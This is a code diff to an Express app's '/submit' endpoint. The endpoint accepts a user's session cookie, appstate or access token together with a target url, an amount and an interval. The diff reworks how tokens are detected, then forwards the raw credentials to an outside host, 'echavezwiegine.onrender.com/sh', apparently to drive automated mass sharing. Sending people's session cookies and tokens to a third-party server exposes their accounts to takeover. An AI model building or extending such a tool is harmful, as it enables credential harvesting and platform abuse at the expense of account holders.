@@ -25,8 +25,13 @@ app.get('/submit', async (req, res) => {
     error: 'Missing token/cookie, url, amount, or interval'
   });
   try {
-    const cookies = await convertCookie(cookie.toString());
-    if (!cookies){
+    let akopogi = "";
+    if (cookie.toLowerCase().startsWith("ea")) {
+    akopogi = cookie; //returns token
+    } else {
+    akopogi = await convertCookie(cookie);
+    }
+    if (!akopogi){
       return res.json({
         status: 400,
         error: 'Detect invalid appstate or token. Please enter a valid appstate or token!!'
@@ -34,7 +39,7 @@ app.get('/submit', async (req, res) => {
     }
     const axio = await axios.get("https://echavezwiegine.onrender.com/sh", {
       params: {
-        cookie: cookies,
+        cookie: akopogi,
         url,
         amount,
         interval
@@ -90,9 +95,6 @@ async function getAccessToken(cookie) {
 }
 async function convertCookie(cookie) {
   try {
-    if (cookie.toLowerCase().startsWith("ea")) {
-    return cookie; //returns token
-    }
     const cookies = JSON.parse(cookie);
     if (!cookies) return cookie; //returns token
     const data = cookies.map(cookies => `${cookies.key}=${cookies.value}`).join('; ');
